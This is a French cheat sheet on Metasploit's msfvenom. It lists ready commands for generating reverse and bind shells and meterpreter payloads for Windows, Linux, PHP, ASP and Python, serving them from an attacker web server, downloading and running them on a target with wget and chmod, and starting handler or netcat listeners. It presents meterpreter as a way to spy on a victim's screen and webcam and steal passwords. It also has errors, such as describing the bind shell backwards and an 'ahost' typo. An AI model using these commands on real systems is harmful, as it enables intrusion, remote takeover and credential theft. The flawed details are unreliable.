# MSFVENOM de metasploit 

## Généralités

 MSFvenom est un générateur de payload autonome faisant partie de la suite Metasploit. Un payload est un fichier malveillant et son but est d’obtenir des informations sur la machine sur laquelle il est exécuté. Il existe beaucoup de types de payload, en voici un bel assortiment spécialement conçu pour s’adapter à toutes les situations sur une machine Windows. Ici nous pouvons générer des PL shell ou meterpreter mais quelle est la différence ? Un shell c’est basique c’est juste l’invité de commandes, alors qu’un meterpreter lui permet de lancer des commandes bien différentes, tout en conservant l’accès au shell basique. On peut lui demander par exemple d’enregistrer l’écran de la victime, accéder à sa webcam, extraire ses mots de passe et bien plus encore. 


## Syntaxe globale msfvenom

```bash
msfvenom -p <payload> [options]
```
## Télécharger un payload sur une machine cible 

Une fois qu'on est sur la machine cible, il faut pouvoir lui transmettre la payload. Pour cela il est possible d'utiliser un serveur web.

Le plus simple étant de générer un serveur web sur la machine attaquante (ayant la payload) via python.

```bash
python3 -m http.server [PORT]
```
Le port de base est 80 mais il est conseillé d'utiliser un autre port tel que 9000.
Ainsi on crée un serveur web sur la machine attaquante qui liste l'ensemble des fichiers de la machine attaquante. Il suffit ensuite de télécharger la payload sur la machine cible via la commande wget.

```bash
sudo wget http://<IP>:<PORT>/payload
```

## Exécuter une payload sur une machine cible

Il ne faut pas oublier de changer les droits du fichier exécutable de payload une fois sur la machine cible si on ne peut pas l'éxécuter.

```bash
chmod +x payload
```



## Types de payload

### Les payloads php 

/!\ Les payloads php sont générées avec des commentaires. Il faut donc supprimer les commentaires (en utilisant nano par exemple).

### Linux Executable and Linkable Format (ELF)

Le format .elf est comparable au format .exe de Windows. Il s'agit de fichiers exécutables pour Linux. Cependant, vous devrez peut-être vous assurer qu'ils disposent des droits d'exécution sur la machine cible. Par exemple, une fois que vous avez le fichier shell.elf sur votre machine cible, utilisez la commande chmod +x shell.elf pour accorder les permissions d'exécution. Une fois cela fait, vous pouvez exécuter ce fichier en tapant ./shell.elf sur la ligne de commande de la machine cible.

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > /home/kali/Bureau/payload.elf
```

### Windows

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe
```

### PHP
```
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php
```
### ASP
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp
```

### Python
```
msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py
```

### Le bind shell


Le Bind Shell c’est quand la machine victime se connecte elle-même au Kali. 

Génération du payload :

```bash
msfvenom -p windows/meterpreter/bind_tcp -f exe > /home/kali/Bureau/bind.exe
```

Lancement du listener :

```bash
sudo msfconsole
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/bind_tcp
msf6 exploit(multi/handler) > set LHOST <IP>
msf6 exploit(multi/handler) > set LPORT <PORT>
msf6 exploit(multi/handler) > run
```

### Le reverse TCP

Avec le Reverse TCP c’est le Kali Linux qui écoute sur un port et attends que la victime se connecte.

Génération du payload :

```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost= [IP] lport=5555 -f exe > /home/kali/Bureau/reverse_tcp.exe
```

Lancement du listener :

```bash
sudo msfconsole
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST <IP>
msf6 exploit(multi/handler) > set LPORT <PORT>
msf6 exploit(multi/handler) > run
``` 

### Le HTTP payload

Le HTTP payload permet d’ouvrir une session sur une machine qui aurait ses ports de fermés, en passant par le port 443 ouvert par défaut.

Génération du payload :

```bash
msfvenom -p windows/meterpreter/reverse_https lhost= [IP] lport=443 -f exe > /home/kali/Bureau/reverse_https.exe
```

Lancement du listener :

```bash
sudo msfconsole
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_https
msf6 exploit(multi/handler) > set LHOST <IP>
msf6 exploit(multi/handler) > set LPORT <PORT>
msf6 exploit(multi/handler) > run
```

### Le Netcat Reverse shell

Génération du payload :

```bash
msfvenom -p windows/shell_reverse_tcp ahost= [IP] lport=1111 -f exe > /home/kali/Bureau/ncshell.exe
```

Lancement du listener :

```bash
nc -lvp 1111
```

### Windows Meterpreter

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe
```

### Windows Meterpreter (x64)

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe
```

### Windows Meterpreter (x86)

```bash
msfvenom -p windows/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe
```

### Windows Reverse Shell

```bash
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe
```

### Windows Reverse Shell (x64)

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe
```

### Windows Reverse Shell (x86)

```bash
msfvenom -p windows/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe
```

### Windows Reverse Shell (x86) (Non Staged)

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe
```
